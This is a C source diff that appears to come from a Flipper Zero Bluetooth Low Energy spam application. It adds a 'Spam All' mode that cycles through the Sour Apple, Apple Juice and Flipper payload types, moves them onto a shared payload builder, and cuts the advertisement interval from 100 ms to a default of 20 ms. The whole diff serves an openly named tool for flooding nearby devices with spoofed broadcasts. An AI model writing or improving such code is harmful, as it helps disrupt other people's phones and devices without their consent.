@@ -28,9 +28,10 @@ static const char* attack_short_names[] = {
     [BleSpamAttackSourApple] = "Sour Apple",
     [BleSpamAttackAppleJuice] = "Apple Juice",
     [BleSpamAttackFlipperZero] = "FlipperZero",
+    [BleSpamAttackSpamAll] = "Spam All",
 };
 
-static const uint32_t speed_steps[] = {50, 100, 150, 200, 300, 500};
+static const uint32_t speed_steps[] = {10, 20, 50, 100, 200, 500};
 #define SPEED_STEP_COUNT (sizeof(speed_steps) / sizeof(speed_steps[0]))
 
 static FuriThread* s_spam_thread = NULL;
@@ -156,21 +157,27 @@ static uint8_t build_next_payload(BleSpamApp* app, uint8_t* buf) {
         break;
     }
     case BleSpamAttackSourApple:
-        name = "Sour Apple";
-        len = ble_spam_build_mar_sour_apple(buf);
+        len = ble_spam_build_mar_payload(
+            MarPayloadApple, buf, generated_name, sizeof(generated_name));
+        name = generated_name;
         break;
-    case BleSpamAttackAppleJuice: {
-        uint16_t idx = app->current_index % APPLE_DEVICE_COUNT;
-        name = apple_devices[idx].name;
-        len = ble_spam_build_mar_apple_device(buf, apple_devices[idx].device_id);
-        app->current_index = idx + 1;
+    case BleSpamAttackAppleJuice:
+        len = ble_spam_build_mar_payload(
+            MarPayloadAppleJuice, buf, generated_name, sizeof(generated_name));
+        name = generated_name;
+        break;
+    case BleSpamAttackFlipperZero:
+        len = ble_spam_build_mar_payload(
+            MarPayloadFlipper, buf, generated_name, sizeof(generated_name));
+        name = generated_name;
+        break;
+    case BleSpamAttackSpamAll: {
+        MarPayloadType mar = (MarPayloadType)(app->current_index % MarPayloadCount);
+        app->current_index++;
+        len = ble_spam_build_mar_payload(mar, buf, generated_name, sizeof(generated_name));
+        name = generated_name;
         break;
     }
-    case BleSpamAttackFlipperZero:
-        ble_spam_random_name(generated_name, 6);
-        name = generated_name;
-        len = ble_spam_build_mar_flipper(buf, generated_name);
-        break;
     default:
         break;
     }
@@ -217,7 +224,7 @@ void ble_spam_scene_running_on_enter(void* context) {
 
     app->running = false;
     app->packet_count = 0;
-    app->delay_ms = 100;
+    app->delay_ms = 20;
     app->current_index = 0;
     app->current_device[0] = '\0';
 
